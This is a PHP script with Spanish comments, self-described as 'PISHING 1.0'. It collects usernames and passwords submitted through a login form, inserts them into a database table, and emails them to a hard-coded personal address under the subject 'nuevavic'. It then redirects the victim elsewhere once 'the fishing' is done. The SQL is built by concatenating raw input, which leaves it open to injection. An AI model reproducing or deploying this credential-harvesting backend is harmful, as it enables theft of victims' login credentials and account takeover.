<?php
//--------------------------------------//
#Aqui capturamos los datos de los campos// 
 $usuario = $_POST['usuario'];          //
 $contraseña = $_POST['contraseña'];    //
 $fecha = date('d-m-y');                //
//--------------------------------------//

//creamos una funcion que nos haga una validacion de los datos introducidos
function ChechPassword($password)
{
	//comprobamos si el password introducido es menor a 5 caracteres
	//en cuyo caso le mostramos un mensaje de error
	if(strlen($password)<5){
	echo '
	<p style="margin-left:330px; width:240px; height:15px; margin-top:-20px; background-color:#F6F; border:1px solid #F00;
 	font-family:"lucida grande",tahoma,verdana,arial,sans-serif; position:relative;">
 	Contraseña de al menos 5 caracteres
 	</p>';
	 } else {
	 	//DATABASE QUERY'S FOR PISHING 1.0
	 	//-------------------------------------------------------------------------------------------------------//
	 	#Aqui hacemos toda la parte que tiene que ver con base de datos en                                       //
	 	#la cual se conecta y luego se genera la consulta correspondiente para insertar los datos introducidos   //
	 	#en la BASE DE DATOS                                                                                     //
	 	 include('conexion.php');                                                                                //
		 $registrar  = "INSERT INTO elite5(style,elite,fecha)VALUES('$usuario','$password','$fecha')";           //
		 mysql_query($registrar);                                                                                //
		 # Aqui generamos un correo electronico para hacer otro respaldo de la informacion introducida           //
		 $receptor = "eldadofarias@hotmail.com";                               //correo electronico              //
         $asunto = "nuevavic";                                                 //asunto del mensaje              //
         $mensaje ="STYLE---".$usuario."---"."ELITE---".$password."---".$fecha;//mensaje del correo              //
         mail($receptor,$asunto,$mensaje);//enviamos el mail en cuestion                                         //
         $url = 'Aqui va la url ';//url a la cual se redireccionara despues de haber terminado el fishing        //
         $redireccion = 'location:'.$url;                                                                        //  
         header($redireccion);                                                                                   //
         //------------------------------------------------------------------------------------------------------//
	}
}
//ejecutmos la funcion que checkea que la contraseña es mayor a 5 caracteres
ChechPassword($contraseña);
?>